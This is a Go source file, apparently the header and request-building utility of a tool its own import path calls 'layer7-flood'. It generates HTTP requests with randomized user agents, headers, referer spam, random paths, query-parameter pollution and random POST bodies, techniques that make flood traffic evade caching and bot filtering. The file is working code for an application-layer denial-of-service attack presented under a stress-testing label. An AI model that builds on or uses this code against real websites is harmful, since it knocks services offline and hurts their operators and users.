// pkg/utils/headers.go
package utils

import (
    "net/http"
    "strings"

    "github.com/stresstest/layer7-flood/pkg/config"
)

func CustomizeRequest(req *http.Request, cfg *config.Config) {
    if cfg.Headers.RandomUserAgents {
        req.Header.Set("User-Agent", RandomUserAgent())
    }
    
    if cfg.Headers.RandomHeaders {
        headers := map[string]string{
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT":             "1",
            "Connection":      "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        for k, v := range headers {
            if RandomInt(0, 100) > 20 { // 80% chance to include
                req.Header.Set(k, v)
            }
        }
        
        // Random custom headers
        for i := 0; i < RandomInt(0, 8); i++ {
            key := "X-" + RandomString(RandomInt(5, 15))
            value := RandomString(RandomInt(10, 30))
            req.Header.Set(key, value)
        }
    }
    
    for k, v := range cfg.Headers.CustomHeaders {
        req.Header.Set(k, v)
    }
    
    if cfg.Headers.RefererSpam {
        referers := []string{
            "https://google.com/search?q=" + RandomString(10),
            "https://bing.com/search?q=" + RandomString(10),
            "https://facebook.com",
            "https://youtube.com",
            "https://twitter.com",
        }
        req.Header.Set("Referer", referers[RandomInt(0, len(referers)-1)])
    }
}

func BuildRequest(cfg *config.Config, workerId int) *http.Request {
    targetURL := cfg.Target.URL
    
    // Path randomization
    if RandomInt(0, 100) > 70 {
        targetURL = targetURL + "/" + RandomString(RandomInt(8, 25))
    }
    
    // Query parameter pollution
    if RandomInt(0, 100) > 50 {
        if strings.Contains(targetURL, "?") {
            targetURL += "&" + RandomString(6) + "=" + RandomString(10)
        } else {
            targetURL += "?" + RandomString(6) + "=" + RandomString(10)
        }
    }
    
    var body string
    method := "GET"
    if RandomInt(0, 100) > 80 { // 20% POST requests
        method = "POST"
        body = "key=" + RandomString(20) + "&value=" + RandomString(30)
    }
    
    req, _ := http.NewRequest(method, targetURL, strings.NewReader(body))
    
    if method == "POST" {
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    }
    
    return req
}
